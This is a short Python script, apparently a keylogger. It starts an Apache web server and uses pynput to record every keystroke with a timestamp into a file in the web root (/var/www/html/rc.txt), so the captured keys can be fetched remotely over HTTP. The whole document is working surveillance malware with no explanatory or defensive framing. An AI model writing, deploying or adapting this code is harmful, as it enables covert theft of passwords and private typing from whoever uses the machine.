from pynput.keyboard import Key, Listener
import logging
import os

os.system("service apache2 start")

log_dir = "/var/www/html/"

logging.basicConfig(filename=(log_dir + "rc.txt"),level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()


